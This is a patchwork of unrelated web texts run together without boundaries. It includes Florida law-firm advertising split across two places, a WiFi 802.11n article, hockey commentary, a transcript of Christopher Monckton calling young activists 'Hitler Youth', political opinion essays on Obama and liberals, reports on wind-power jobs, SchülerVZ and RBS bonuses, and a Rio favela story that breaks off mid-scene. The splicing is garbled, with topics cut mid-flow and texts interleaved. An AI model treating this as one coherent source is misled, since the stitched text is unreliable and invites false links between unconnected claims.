Our South Florida firm is one of only a few in the state that handle foreclosure defense cases .
We represent individuals and families throughout Florida .
Even if we are unable to travel to your location , judges across the state allow attorney Tim Kingcade to “ appear ” via phone .
We know this is a stressful and scary situation for you .
We also know that you have rights , and we are willing to fight for those rights on your behalf .
Our lawyers have many years legal practice experience , and we have devoted our professional careers to helping people like you get back on their feet .

In a couple of years , crossing the 1 Gbps threshold with a WiFi access point will be routine .
That access point will likely have two radios , one for each major spectrum band , and support a host of older flavors for compatibility .
Eventually , WiFi will approach the robustness and speed needed to make it a completely viable replacement for Ethernet for most users .
In today 's pipeline are optional enhancements to 802.11n that have been in the works since the standard stabilized at the IEEE engineering group nearly three years ago .
These enhancements will increase range and performance by up to a couple orders of magnitude , offering raw data rates of 450 Mbps and 600 Mbps .
The slated improvements will also correct for black holes , where current 802.11n gear 's signals do n't reach unless an excessive amount of overlapping devices are installed at relatively high expense .
Even better , the boosts to 802.11n are just the start .
A new IEEE committee is working on fast WiFi that will hit a raw encoding rate of 1 gigabit per second ( Gbps ) .
All these higher speeds will be eminently affordable and reasonable choices for small - to - medium - sized businesses .
It may even be possible to achieve higher performance ( both for speed and network consistency ) by spending less than a network upgrade would cost today : fewer , more powerful access points with better coverage may wind up saving money .
The need is n't always for speed : it may be better to have a network that works in the worst circumstances , with tons of users moving lots of data , than to move additional raw data .
With the popularity of watching video ( for business purposes , no less ) , the growth in the size of standard document files , continuous network backups , and other network loads , network capacity , quality , and support for simultaneous users and heavy - load applications will become increasingly important .
Faster WiFi paradoxically also means that more wired infrastructure is needed .
With individual access points able to pump out a dual - band total of several hundreds Mbps , and future dual - band devices topping 1 Gbps , more robust and higher - performance backhaul will also be needed .
From a tiny nut , a great oak
The 802.11n standard has come a long way from its contentious origins , when MIMO ( multiple in , multiple out ) antenna arrays were seen as impractical , expensive , and beside the point of pushing data over the air .
Now , in addition to 802.11n , all 3.5G and 4G cellular wireless standards either require or allow the use of MIMO for better coverage and performance .
At a time when 802.11g could only deliver 20 to 30 Mbps of real throughput out of a potential 54 M bps raw data or " symbol " rate , the idea of 150 M bps with 75 to 100 Mbps of actual throughput was pretty stunning .
But it got better .
By the time manufacturers coalesced their efforts — after a cantankerous process — around a single approach for 802.11n , it was clear that all access points and adapters would support two radio streams , each of which would be able to handle a raw rate of 150 Mbps , for a combined 300 Mbps .
Each stream is a chain of radio components that share antennas .
For sending , each stream transmits uniquely and simultaneously across space , using signal reflection in the environment in the same way that a billiards player uses bumpers to strike a ball .
This is called spatial multiplexing : multiple signals encoded using space as a parameter .
A receiver decodes the signals across multiple antennas , dumping each stream into a unique radio chain .
A receiver with a like number of radio chains , and often a similar number of antennas , can interpret the directionality of signals , sifting out separate streams to reconstruct the original message .
For instance , a 2x2 ( two transmit , two receive ) antenna array is often paired with two radio streams , or a 3x3 with three radio streams .
Some devices with two radio streams might have 2x3 arrays , in which three receive antennas are used to improve signal differentiation and range .
Two chains is good .
But what about three ?
Or four ?
These optional enhancements to 802.11n were eminently possible , but with the exception of wireless chipmaker Marvell and startup Quantenna , most firms sat out the dance , waiting for a shoe to drop : interoperable certification from the WiFi Alliance .
Certifiably streamy
The need is n't always for speed : it may be better to have a network that works in the worst circumstances , with tons of users moving lots of data , than to move additional raw data .
The WiFi Alliance is a trade group that popularizes wireless networking as a technology to use while also setting certification testing for companies that want to use the WiFi label and branding on products .
Apple , Cisco , Intel , Microsoft , Nokia , and many similar firms sit on the group 's board .
WiFi has managed the neat task of herding cats for a decade , even as standards have proliferated into an alphabet soup of a , b , g , e , i , aa , and more — and as the IEEE 802.11n proceedings threatened to scuttle industry - wide compatibility .
The group persevered , ultimately offering a Draft N certification that was an interim brand while the 802.11n spec was being finished , and which has now transition to just " N . "
With the ratification of 802.11n as a finished spec earlier this year by the IEEE , the WiFi Alliance released an updated certification program designed to standardize several more obscure elements of 802.11n that were n't fixed in stone until near the end .
The most important of these were multi-stream 802.11n devices , starting with three - stream radios .
The certification process seems to have taken the brakes off the industry besides Marvell , all of which are now looking to three - stream radios and beyond .
For instance , Atheros announced its 2010 series of 3x3 three - stream chips shortly after the WiFi Alliance 's certification news .
The chips have to exist before the alliance can create a certification standard , which is why these evolutions all come together at once .
Likewise , while four - stream devices are defined in the 802.11n spec , the WiFi Alliance wo n't be able to approve such devices until chipmakers have them available .
So far , it 's difficult to tell what hardware is shipping with 3x3 antenna arrays and three - stream systems installed .
Apple 's October 2009 update to the AirPort Extreme Base Station and Time Capsule access point and network - attached storage device include three - stream radios , but Apple is n't advertising the feature .
On its base station pages , the company says only that the latest revision " gives [s ] you up to 50 percent better WiFi performance and up to 25 percent better range " than its immediate predecessor .
This conforms with 3x3 antenna arrays , which , even with a two - stream radio , carry data further at higher speeds .
However , the device has the capability of higher speed , too , several industry sources confirmed who declined to be identified .
Apple did n't respond to multiple requests for clarification .
The three streams in Apple 's base stations require 3x3 , three - stream adapters to reach higher speeds .
This means redesigned WiFi adapters in Apple gear or those made by other companies ; so far , only Intel seems to have a three - stream laptop radio available , found in only a few computers .
BUFFALO — Derek Who ?
While a noted national sports publication has named some baseball player called Derek Jeter as Sportsman of the Year , our selection did n’t establish a hallowed franchise record and he did n’t win a championship .
All Markus Naslund did this year following his one season on Broadway was set a standard of integrity so high that it cannot and must not be overlooked , perhaps now more than ever in a culture of celebrity where it seems everything can be bought and everyone can be bought off and paid for .
Naslund scored 24 goals last year after signing a two - year , $ 8 million free agent contract with the Blueshirts , under which he earned $ 5 M in 2008 - 09 and was due to receive $ 3 M this year .
But when the season ended , the 35 - year - old winger ( who turned 36 at the end of July ) recognized he could no longer play up to the elite level he had established for himself over more than a decade in Vancouver .
BROOKS ON TWITTER
SLAPSHOTS BLOG
And so , within 48 hours of the Rangers ’ playoff elimination , Naslund told GM Glen Sather , head coach John Tortorella and his teammates that he had played his last game , that he was going to retire even with the year remaining on his contract .
Wanting to get younger and faster , neither of which were in No. 91 ’s power to accomplish , the Rangers would have bought out Naslund ’s contract for this season .
Under terms of the collective bargaining agreement , Naslund was guaranteed $ 2 M in a buyout ; $ 2 M he would have received simply by remaining silent and deferring announcement of his retirement until the transaction has been completed .
But Naslund did not remain silent .
He announced his retirement on May 5 , thus forfeiting the $ 2 M while saving the Rangers cap space for this season and next .
He announced his retirement through a statement released by the team and simply returned home , to Sweden , where he would embark on his post - hockey career life .
Not quite , though , because when his great friend Peter Forsberg declared last month that he would play this season for MODO in the Swedish Elite League , Naslund came out of retirement to join him .
And because MODO is in financial trouble , Naslund and Forsberg both are playing for free to help the cause .
Naslund was not a great player by the time he arrived on Broadway .
He was more than that .
And he is Slap Shots ’ Sportsman of the Year .
* Let ’s get this straight : there is no need for Alex Ovechkin , the NHL ’s most compelling the player , to change the way he attacks the game or the puck .
There is no reason for Ovechkin to change the way he plays anymore than there was a need for the ferocious Mark Messier to change , the fearsome Eric Lindros to change ( except for carrying the puck with his head down , but that ’s a different matter ) , and the feared Forsberg to alter his game back in the day when the then Colorado center would allow defensemen to win races for pucks so he could then batter them into the wall and then gain possession .
But .
But there is a need for the NHL to change its approach and discipline Ovechkin when and if necessary , just as the league would discipline any player whose recklessness causes injuries to opponents .
Which , of course , means that as repeat offender Matt Cooke received the very same and meager two - game sentence for delivering a head shot to Artem Anisimov last Saturday , only 10 months after getting two games for his hit to the head of Matt Walker , Ovechkin has nothing to worry about .
* Ever since Feb. 17 , 1979 , the day the great Bernie Parent was poked in the eye by a stick and thus forced into retirement , the Flyers have been blind to the necessity of having a big - time goaltender in order to actually win something .
Since the ’ 97 choking situation of the sweep by Detroit in the Cup Final , the Flyers have trotted out Ron Hextall , Garth Snow , Sean Burke , John Vanbiesbrouck ( the on - the - cheap free agent signing when both Mike Richter and Curtis Joseph were on the market during the summer of 1998 ) , Brian Boucher , Roman Cechmanek , Robert Esche , Jeff Hackett , Antero Niittymaki , Marty Biron and now Ray Emery as their No. 1 netminders .
While , by the way , the East ’s preeminent team , New Jersey , has had one No. 1 in Martin Brodeur and the West ’s preeminent team , Detroit , has had three in Mike Vernon , Chris Osgood , Dom Hasek and Cujo .
* All right , who will the Yanks have in the middle between Zach Parise and Jamie Langenbrunner when Our Boys compete in the Olympics ?

Christopher Monckton berates a group of young activists for interrupting a meeting of climate sceptics in Copenhagen , calling them ' Nazis ' and ' Hitler Youth '
When Christopher Monckton , the hereditary third Viscount Monckton of Brenchley , attended an Americans for Prosperity meeting in Copenhagen on Wednesday night that was interrupted by chanting youth delegates , he was reportedly furious .
But no one expected him to go back and berate them .
Yesterday he ambushed a small group of students from the non-profit SustainUS inside the Bella centre .
One of them texted her friends for help .
Several arrived , including Ben Wessel , a 20 - year - old activist from Middlebury College , Vermont .
Monckton then repeatedly called them " Nazis " and " Hitler Youth " .
When Wessel told him that his family were Jewish , Monckton carried on .
" I was so surprised , " Wessel said today .
" I hoped to have a more civil conversation with the man .
It 's fine that we have differences , but it 's not okay to pull out such hateful language . "
Here 's the full transcript of the exchange between Wessel and Monckton :
Ben Wessel : [ of the Sustain US youth delegation ]
First of all my name is Ben [ sticks his hand out to shake ] .
Monckton : No , no .
I 'm not going to shake the hand of Hitler Youth .
I 'm sorry .
Wessel : Sir , as a Jew I 'm not really sure how I should take that .
Monckton : I 'll tell you how you should take it .
You should take it .
Wessel :
My grandparents escaped the Nazis growing up in Germany .
Monckton : Because of the biofuel scam , world food prices have doubled .
That it because of the global warming scare , which you wo n't look at the science of .
As a result of that , millions are dying in third world countries because food prices have doubled because of the biofuel scam , because of the global warming scare .
And you people do n't care .
And until you start caring I will call you Hitler Youth if you ever again interrupt any meeting at which I am present , where we are trying to have a private conversation .
Monckton : [ talking over everyone ]
Tough luck .
So now you know what it looks like when you do robotic chants of the sort which the Hitler Youth used to do in Copenhagen when they occupied this city .
Unidentified youth : Sir , you just need to grow up !
Monckton : I have cited scientific papers ...
So I think you should all just chill out and accept that if you ever behave like that again I will call you that again in public .
You 're already now known and your faces around the world are known as members of the Hitler Youth , or people who do as much damage to the poor as the Hitler Youth did .
And you have got to accept that if you are not willing to take it , then you should n't give it .
And do n't you go around invading people 's meetings again .
Thank you very much .
Good day to you all .
[ Monckton walks away and Wessel follows ]
Wessel : I think it 's good to not try and drown out other people 's opinions and I do agree with that .
Monckton :
That 's what you did .
That 's what you did .
That is what the Hitler Youth did .
And if you behave like the Hitler Youth , I 'll call you what you are - Hitler Youth .
And you 'll like or it or you 'll lump it .
Wessel : Okay .
I 'll let you know how I feel about that personally in a second .
Monckton : Tough ....
Wessel : I would like to tell you though , that for as long as I 've been alive ... the past 20 years , the science has been settled .
The two debate the science of anthropogenic climate change .
Wessel : I would like to give you my card , if you would like to discuss this .
Monckton : I do not wants the cards of the Hitler Youth .
No .
Wessel : Sir , as a Jew , again ... I think ... this is absurd and I 'm just getting a little frustrated ...
Monckton : I have just seen what has happened for instance in Haiti because of people like you , shrieking in public meetings and propagandising so as to try and push an agenda which has nothing to do with looking after the poor of this planet , who are now dying in large numbers of starvation .
Because people like you act just as those they were - the Hitler Youth .
So I will call you what you are and you will like it or lump it .
And do n't you dare ever invade any meeting of mine again and behave in that childish , boonish , Hitler - ish fashion .
Do I make myself clear ?
My primary office is located at 6100 Glades Rd. , Suite 311 , Boca Raton , FL 33434 .
I am right on the corner of Glades Road and St. Andrews Boulevard , just west of the Town Center Mall .
My office is situated in the white BB & T Bank Building , and easily recognizable from Glades Road .
Although my office is in Boca Raton , Florida , I primarily represent individuals throughout Broward County and Palm Beach County , Florida .
Prior to relocating my office to Boca Raton , Florida , my office was in Fort Lauderdale , Florida for over 25 years .
I am frequently in court in both Broward and Palm Beach counties , and I am as equally well known in each of these counties .
My family Law practice has not been limited to just these two counties over the course of my career .
I have litigated cases throughout the State of Florida as well as having filed numerous appeals .
I have had the pleasure and distinct honor of appearing on numerous occasions before the 4th District Court of Appeal , as well as the Supreme Court of the State of Florida .
Family Law encompasses a wide range of areas , all of which I am extremely competent to handle on your behalf .
A brief description of some of the areas that most people will experience in their lifetimes are set forth below :
Florida is a “ No Fault ” divorce state .
You no longer need to allege and prove specific grounds for a divorce , such as physical or mental cruelty , or even adultery .
All of those various grounds for divorce are no longer applicable .
The only recognizable grounds for a divorce in Florida is that the marriage must be “ Irretrievably Broken ” .
What exactly did that term mean ?
It simply means that at least one party to the marriage believes that there is absolutely nothing anyone can do to save the marriage , and that it is time for the marriage to be dissolved .
The most common issues that a Court usually deals with in a divorce case involves the division of marital property , time sharing issues with minor children , and spousal support , more commonly known as alimony .
Paternity cases are limited to situations that involve minor children .
Paternity cases are different from divorce because the parents in a paternity case have never been married .
Since the parents in a paternity case are not married , the court is limited to issues solely related to the child , such as time sharing , extracurricular activities , child support , and health insurance for the minor child .
Paternity should be taken seriously , especially by fathers .
The father has no rights to his child , even if he is listed on a birth certificate , until he files a court case and establishes his paternity through a legal proceeding .
Once paternity is established , the rights of either parent or equal , and no different than the parents in a divorce proceeding .
A paternity case should be filed as soon as the child is born .
Family Law is a term that is generally used to encompass all of the various proceedings that fall within the category of Family Law .
This includes divorce , paternity , time sharing , adoptions , child support , equitable distribution , domestic violence proceedings , or any other matter that involves the family .
How much child support can I expect to receive for my children , or how much child support will I be expected to pay ?
Those are very legitimate questions , and are probably asked of me more than any other question .
The calculation for child support involves several factors , and you need to know each and every factor in order to calculate an accurate amount of child support .
The primary factor of course is the monthly gross income for each parent .
That is a good starting point .
You also need to know the time - sharing schedule that the parents will have with their minor child or children .
This is important because child support is not only based on income , but is also based on the number of overnights that a parent spends with his children .
These are the main factors utilized in the calculations , but to get a more accurate calculation , you need to know how much each parent pays for their own health insurance , which is a figure that is deducted from the gross income just like taxes and mandatory union dues .
You also need to know the cost of the health insurance for the minor children , and which parent is paying for that expense .
Finally , you need to take into consideration the child care expense for the children .
Once you have all of these figures you should be able to calculate the amount of child support involved in your case .
The term custody has been abolished in the State of Florida .
Time sharing is the terminology that has replaced the term custody .
This is not simply the use of new terms , but has important and significant aspects to the term time - sharing .
By its very own definition , time sharing is the sharing of time between the mother and father and their minor child or children .
The term time - sharing recognizes that neither the mother or the father is more important than the other in the life of the children .
This is a very reason why the term custody has been abolished in the State of Florida .
The term custody carried with it somewhat of a negative implication that the parent who had custody was more important than the other parent who did not have custody .
Time - sharing is a new standard in Florida which equalizes the playing field for the parents .
In other words , one parent is no more important than the other in the lives of their children .
Time - sharing is equally applicable in divorce cases as well as paternity cases .
If the parents are unable to agree on their own time sharing schedule , the court will impose such a schedule on the parents .
There are multiple factors that the court will look at , but the bottom line is that the parents , who know the children better than anyone , are in a much better position to do what is in the best interest of their children .
Alimony is a support obligation , which is sometimes owed by one spouse to the other , at the conclusion of the marriage .
There are various types of alimony which can be awarded in the State of Florida .
Alimony is based on several factors , including the length of the marriage , whether there are minor children , a disparity in income of the parties , and the ability of one party to meet the financial need of the other party , if a need exists .

Liberals are a useless lot .
They talk about peace and do nothing to challenge our permanent war economy .
They claim to support the working class , and vote for candidates that glibly defend the North American Free Trade Agreement .
They insist they believe in welfare , the right to organize , universal health care and a host of other socially progressive causes , and will not risk stepping out of the mainstream to fight for them .
The only talent they seem to possess is the ability to write abject , cloying letters to Barack Obama — as if he reads them — asking the president to come back to his “ true ” self .
This sterile moral posturing , which is not only useless but humiliating , has made America ’s liberal class an object of public derision .
I am not disappointed in Obama .
I do n’t feel betrayed .
I do n’t wonder when he is going to be Obama .
I did not vote for the man .
I vote socialist , which in my case meant Ralph Nader , but could have meant Cynthia McKinney .
How can an organization with the oxymoronic title Progressives for Obama even exist ?
Liberal groups like these make political satire obsolete .
Obama was and is a brand .
He is a product of the Chicago political machine .
He has been skillfully packaged as the new face of the corporate state .
I do n’t dislike Obama — I would much rather listen to him than his smug and venal predecessor — though I expected nothing but a continuation of the corporate rape of the country .
And that is what he has delivered .
“ You have a tug of war with one side pulling , ” Ralph Nader told me when we met Saturday afternoon .
“ The corporate interests pull on the Democratic Party the way they pull on the Republican Party .
If you are a ‘ least - worst ’ voter you do n’t want to disturb John Kerry on the war , so you call off the anti-war demonstrations in 2004 .
You do n’t want to disturb Obama because McCain is worse .
And every four years both parties get worse .
There is no pull .
That is the dilemma of The Nation and The Progressive and other similar publications .
There is no breaking point .
What is the breaking point ?
The criminal war of aggression in Iraq ?
The escalation of the war in Afghanistan ?
Forty - five thousand people dying a year because they can’t afford health insurance ?
The hollowing out of communities and sending the jobs to fascist and communist regimes overseas that know how to put the workers in their place ?
There is no breaking point .
And when there is no breaking point you do not have a moral compass .
”
I save my anger for our bankrupt liberal intelligentsia of which , sadly , I guess I am a member .
Liberals are the defeated , self - absorbed Mouse Man in Dostoevsky ’s “ Notes From Underground . ”
They embrace cynicism , a cloak for their cowardice and impotence .
They , like Dostoevsky ’s depraved character , have come to believe that the “ conscious inertia ” of the underground surpasses all other forms of existence .
They too use inaction and empty moral posturing , not to affect change but to engage in an orgy of self - adulation and self - pity .
They too refuse to act or engage with anyone not cowering in the underground .
This choice does not satisfy the Mouse Man , as it does not satisfy our liberal class , but neither has the strength to change .
The gravest danger we face as a nation is not from the far right , although it may well inherit power , but from a bankrupt liberal class that has lost the will to fight and the moral courage to stand up for what it espouses .
Anyone who says he or she cares about the working class in this country should have walked out on the Democratic Party in 1994 with the passage of NAFTA .
And it has only been downhill since .
If welfare reform , the 1999 Financial Services Modernization Act , which gutted the 1933 Glass - Steagall Act — designed to prevent the kind of banking crisis we are now undergoing — and the craven decision by the Democratic Congress to continue to fund and expand our imperial wars were not enough to make you revolt , how about the refusal to restore habeas corpus , end torture in our offshore penal colonies , abolish George W. Bush ’s secrecy laws or halt the warrantless wiretapping and monitoring of American citizens ?
The imperial projects and the corporate state have not altered under Obama .
The state kills as ruthlessly and indiscriminately in Iraq , Afghanistan and Pakistan as it did under Bush .
It steals from the U.S. treasury as rapaciously to enrich the corporate elite .
It , too , bows before the conservative Israel lobby , refuses to enact serious environmental or health care reform , regulate Wall Street , end our relationship with private mercenary contractors or stop handing obscene sums of money , some $ 1 trillion a year , to the military and arms industry .
At what point do we stop being a doormat ?
At what point do we fight back ?
We may lose if we step outside the mainstream , but at least we will salvage our self - esteem and integrity .
I learned to dislike liberals when I lived in Roxbury , the inner-city in Boston , as a seminary student at Harvard Divinity School .
I commuted into Cambridge to hear professors and students talk about empowering people they never met .
It was the time of the leftist Sandinista government in Nicaragua .
Spending two weeks picking coffee in that country and then coming back and talking about it for the rest of the semester was the best way to “ credentialize ” yourself as a revolutionary .
But few of these “ revolutionaries ” found the time to spend 20 minutes on the Green Line to see where human beings in their own city were being warehoused little better than animals .
They liked the poor , but they did not like the smell of the poor .
It was a lesson I never forgot .
I was also at the time a member of the Greater Boston YMCA boxing team .
We fought on Saturday nights for $ 25 in arenas in working - class neighborhoods like Charlestown .
My closest friends were construction workers and pot washers .
They worked hard .
They believed in unions .
They wanted a better life , which few of them ever got .
We used to run five miles after our nightly training , passing through the Mission Main and Mission Extension Housing Projects , and they would joke , “ I hope we get mugged . ”
They knew precisely what to do with people who abused them .
They may not have been liberal , they may not have finished high school , but they were far more grounded than most of those I studied with across the Charles River .
They would have felt awkward , and would have been made to feel awkward , at the little gatherings of progressive and liberal intellectuals at Harvard , but you could trust and rely on them .
I went on to spend two decades as a war correspondent .
The qualities inherent in good soldiers or Marines , like the qualities I found among those boxers , are qualities I admire — self - sacrifice , courage , the ability to make decisions under stress , the capacity to endure physical discomfort , and a fierce loyalty to those around you , even if it puts you in greater danger .
If liberals had even a bit of their fortitude we could have avoided this mess .
But they do n’t .
So here we are again , begging Obama to be Obama .
He is Obama .
Obama is not the problem .
We are .
Chris Hedges , author of “ Empire of Illusion : The End of Literacy and the Triumph of Spectacle , ” will speak with other anti-war activists at Lafayette Park across the street from the White House at 11 a.m. Dec. 12 in a rally calling for the withdrawal of all American troops from Iraq and Afghanistan .
ANALYSIS / OPINION :
Barack Obama is not used to being the guy not invited to a party .
At the Copenhagen global warming conference , however , he found that not everyone wanted to hang with him .
Our president ca n’t take a hint .
After Mr. Obama ’s bilateral meeting with Chinese Premier Wen Jiabao , the Chinese began sending lower - level functionaries to the multilateral meetings .
A frustrated Mr. Obama pressed for another bilateral meeting , which was scheduled for Friday at 6:15 p.m .
Other leaders of the countries known as the “ BASIC ” bloc were harder to pin down .
The Obama team tried to schedule a meeting with Indian Prime Minister Manmohan Singh and was told he was at the airport readying to leave .
Brazilian President Luiz Inacio Lula da Silva also was unavailable .
South African President Jacob Zuma said there was no point meeting without India and Brazil .
Then the Chinese pushed the bilateral meeting back to 7 p.m .
“ We were told they were at the airport , ” a senior administration official said .
“ We were told delegations were split up .
We were told they were n’t going to meet . ”
So imagine Mr. Obama ’s surprise when he arrived for the bilateral powwow and found all four leaders in the room already in deep discussion .
“ Are you ready for me ? ” he said with an “ uncharacteristic edge ” to his voice , according to a CBS News report .
“ We were n’t crashing a meeting , ” an Obama flack later explained defensively .
“ We were going for our bilateral meeting . ”
But that did n’t stop him from walking in where he was n’t invited .
Clearly , Mr. Obama learned a few things from his own White House party crashers .
There was no chair at the table for Mr. Obama so he announced he would sit next to his “ friend Lula , ” whose staff had to scramble to make room for the president and Secretary of State Hillary Rodham Clinton .
On Monday , Mr. da Silva used his weekly radio program to rebuke the United States for its stance at Copenhagen .
After Mr. Obama arrived , the BASIC group was basically held hostage .
They had tried politely to keep Mr. Obama at arms length , but since he showed up , decorum mandated that they find a way to save face .
The countries reached agreement on three pages of noncommittal boilerplate - and Mr. Obama rushed out to declare that he had once again saved the day .
“ For the first time in history , ” he said , “ all major economies have come together to accept their responsibility to take action to confront the threat of climate change . ”
He then left the global warming conference , hurrying to beat the record - setting blizzard descending on Washington .
U.N. General Secretary Ban Ki-moon declared that the conferees “ sealed the deal . ”
But there was no deal .
The conference chose not to adopt the Copenhagen Accord after opposition from Latin American nations that are part of Venezuelan President Hugo Chavez ’s Bolivarian Alliance .
The general session became the scene of high theater , or farce - at one point a Venezuelan delegate cut her hand to dramatize the blood of the poor being spilled by the rich .
In the end , the document was officially “ noted ” by the assembled , which renders it not only nonbinding but nonexistent for those countries that choose to ignore it .
Chinese lead negotiator Su Wei made a point of saying that it was “ not an agreed document , it was not formally endorsed or adopted . ”
And while the White House argues that something is better than nothing , in some respects the accord really is nothing .
Appendices One and Two , which were supposed to lay out detailed emissions targets and mitigation actions for signatory counties , were left blank .
The Copenhagen conference was a lesson in power and humility .
The countries in the BASIC bloc demonstrated that the United States lacks the leverage necessary to convince them to make decisions that work against their national interests .
And Mr. Obama is learning the uncomfortable lesson that there are limits to what his personal charisma can achieve .
Mr. Obama did make history at Copenhagen , but not in the way he expected .
It says a great deal about American power and prestige when international leaders go to so much trouble to avoid meeting with the president of the United States .
The American Century is over .

Federal stimulus money rescued the U.S. wind - power industry from what could have been a disastrous 2009 , but it still lost sought - after manufacturing jobs , a trade group reported Tuesday .
Nationwide , the wind - power industry employs about 85,000 people — the same number as a year ago after it gained 13,000 manufacturing jobs in 2008 , says Denise Bode , CEO of the American Wind Energy Association .
JOBS OUTLOOK : Latest data for all states , 384 metros Early last year , the association had expected wind - power development to drop 50 % in year - end levels compared with 2008 , given the dearth of financing for wind - farm projects .
But 2009 federal stimulus dollars , about $ 2.2 billion for dozens of wind projects and wind turbine - component manufacturers , softened the recession 's impact .
" The stimulus was a real spur to development , " she says .
" We saved half an industry . "
The industry last year added 39 % more wind power , a record 9,900 megawatts .
That 's enough to power the equivalent of 2.4 million homes , the association says .
Only 38 wind turbine - component manufacturing plants were built or expanded last year , down from 55 in 2008 .
In addition , several wind - turbine companies announced layoffs last year , including at plants in Minnesota , Pennsylvania and Nebraska .
Bode estimates that the industry lost 1,500 to 2,000 manufacturing jobs last year but gained an equal number in wind - farm construction and maintenance .
Without the stimulus funds , " Things would 've ground to a halt , " says Gary Hardke , president of the San Diego - based Cannon Power Group .
It has installed 400 megawatts of wind power in Washington state in the past 18 months and secured $ 19 million in stimulus funds .
Without the funds , the project " would 've stalled out , " Hardke says .
Manufacturers also suffered because they had big inventory levels last year , Bode says .
Over the longer term , wind - turbine makers have expressed reluctance to build plants in the USA because it lacks a national standard to increase the use of renewable energy sources , Bode says .
Legislation in Congress has proposed the United States get 15 % to 20 % of its energy from renewable sources by 2020 , along with increased efficiencies .
Locally , 29 states have their own requirements to get more of their energy from renewable sources and six states have set goals .
The nation 's wind - power industry provides about 2 % of the USA 's electricity .
That could rise to 20 % in the eastern USA by 2024 if enough money is invested in transmission lines and the power grid , said a study recently released by the Department of Energy .

Die Nachrichtenagentur ddp zitiert den Anwalt der verstorbenen 20 - Jährigen , der wegen versuchter Erpressung in der SchülerVZ - Sache in Haft kam .
Dabei erhebt der Anwalt Ulrich dost schwere Vorwürfe gegen SchülerVZ : Anwalt : Kein Erpressungsversuch gegen SchülerVZ .
Dost sagte , dass seinem Mandanten durch Mitarbeiter des Unternehmens „ ein unbeziffertes Zahlungsangebot gemacht worden sein “ soll .
In einem solchen Fall hätte dem Anwalt zufolge Zahlungsbereitschaft des Unternehmens vorgelegen , „ die folglich nicht mit einer Drohung erzwungen werden musste “ .
Aus Sicht der Verteidigung stelle sich die Frage , ob das Unternehmen seinem Mandanten „ ein Schweigegeld angeboten hat , um das Aufdecken von ‚ Sicherheitslücken ‘ der Plattform in der Öffentlichkeit verhindern zu können “ .
SchülerVZ hat mit einer eigenen Pressemitteilung reagiert und weist die Vorwürfe zurück :
Die VZ - Netzwerke weisen diese Vorwürfe mit Nachdruck zurück .
Markus Berger - de León , CEO VZ - Netzwerke : „ Die Vorwürfe des Anwalts Ulrich Dost sind ebenso unglaublich wie haltlos .
Die Beurteilung und Handhabung des Falls lag und liegt aber bei den zuständigen Behörden . “
Am morgigen Mittwoch diskutiert wohl der Rechtsausschuss des Berliner Abgeordnetenhauses den Suizid .
Die Sitzung wird vermutlich nicht - öffentlich sein .
Update : Danke für den Hinweis in den Kommentaren .

A government minister has told bankers " to come back into the real world " after Royal Bank of Scotland directors threatened to resign over bonuses .
City Minister Lord Myners said it was unrealistic that bankers should expect to be paid million pound bonuses .
RBS reportedly wants to pay a total of £ 1.5 bn in bonuses to investment banking staff , and the board has threatened to quit if the government blocks the move .
The Treasury said it would intervene if it was in the interest of taxpayers .
Meanwhile , Barclays is planning on increasing the non-variable element of staff pay at Barclays Capital , its investment bank , the BBC 's business editor Robert Peston says .
ANALYSIS By Hugh Pym , Chief economics correspondent
The Government is caught between a rock and a hard place .
Many voters cannot understand why taxpayer supported banks should pay their staff any extra bonuses .
In January the Chancellor will have to approve the bonus pot at RBS .
Any increase could generate a backlash against the government .
But the City does n't like what 's seen as interference in the boardroom .
Looks like this will run and run .
Barclays maintains that by pushing up salaries , it is only doing what G20 governments have asked it to do , by shifting the weight of pay from the variable portion - ie bonuses - to fixed .
Legal duty Lord Myners has estimated that at least 5,000 bankers in the UK will earn more than £ 1 m this year .
He told the BBC that the median wage in the UK was just over £ 20,000 a year , and yet some bankers expected as a matter of course to receive bonuses , in addition to their salaries , of millions of pounds .
He also said banks needed to be mindful of the fact that much of the profit they were now making was due to " the benign conditions " created by the government pumping billions of pounds into the economy to stimulate demand .
RBS directors say it is their legal duty to act in the interests of shareholders , and that if they do not pay competitive bonuses , top talent will leave the bank .
This would have an adverse impact on profitability , and therefore the bank 's ability to repay the taxpayer , they argue .
' Pushed around ' Business Secretary Lord Mandelson said : " I understand the point that RBS directors are expressing - they say they have to remain competitive in the market in recruiting senior executives , and this is why it 's important that all the banks are equally restrained , and RBS is not singled out . "
Royal Bank 's directors may well be sending their oppos at Barclays some super - duper Christmas hampers

The Conservatives said the government was sending out mixed messages .
Shadow financial secretary Mark Hoban said : " The government 's policy on bonuses is a muddle .
The city minister claims he will veto big bonuses only to be superseded by the business secretary calling for banks merely to show restraint .
" We have been clear - no significant cash bonuses should be paid out this year and that money should go towards increasing lending to the families and businesses who propped up the banks in the first place . "
Liberal Democrat Treasury spokesman Vince Cable said the government should " call the bluff " of the RBS directors and accept their resignations .
" The government has to impose itself and must not be pushed around , " he told the BBC .
One banking analyst went a step further , suggesting the directors should be sacked .

More from Today programme " Their job is very simple - to fulfil the requirements of the shareholders .
If we tell them to paint everything blue , everything has to be blue , " said Ralph Silva at SRN .
" They should not be going up against shareholders .
I think we should fire them [ before they resign ] . "
But he also argued that the government would be making a mistake if it told the bank not to pay bonuses .
The best bankers who brought in the most profit would leave , he said , and for this reason he thought the bonuses would be paid .
Big profits
But others took a more sympathetic line with the RBS directors .
Stephen Regan at the Cranfield School of Management said that shareholders could not call the shots and only had the power to call an extraordinary general meeting , at which they could vote on whether to oust the board .
" Ownership is with the shareholders , but control of the business is with the directors , " he said .
The government owns 70 % of RBS after bailing out the bank during the height of the financial crisis , a stake that is set to rise to 84 % following the Treasury 's recent pledge to inject billions more into the bank .
Last month , Chancellor Alistair Darling announced that the Treasury , as the major shareholder in the bank , would have the " right to consent " to how much RBS pays in bonuses and how they are paid .
RBS is said to want to pay £ 2bn in bonuses across the group for its performance in 2009 , with £ 1.5 bn going to its investment banking division , which is expected to make £ 6bn in profits this year .

My bright yellow helicopter swoops low over one of Rio's 600 or more favelas , the slums that house some of the most violent , heavily armed gangsters in the world .
For all his many years flying choppers in the city where he was born and raised , Ricardo , my pilot , has never been over these areas , let alone at such a low altitude : we are about 50 metres above the mess of jerry - built brick and concrete houses , the tangled wires of stolen electricity , and the pot -holed streets of Coreia , where 150,0000 people try to survive grinding poverty and the urban war that surrounds them .
The drug lord who controls Coreia is one of the main characters in my film , Dancing with the Devil , a sort of City of God meets The Wire – but all for real .
Ricardo is understandably nervous .
The previous Christmas , some bright spark had the idea of flying Father Christmas over the city in a helicopter to deliver gifts to kids in a slum ; no one told the gangsters and the chopper was fired on .
" Are you sure you have cleared this with the traficantes ? "
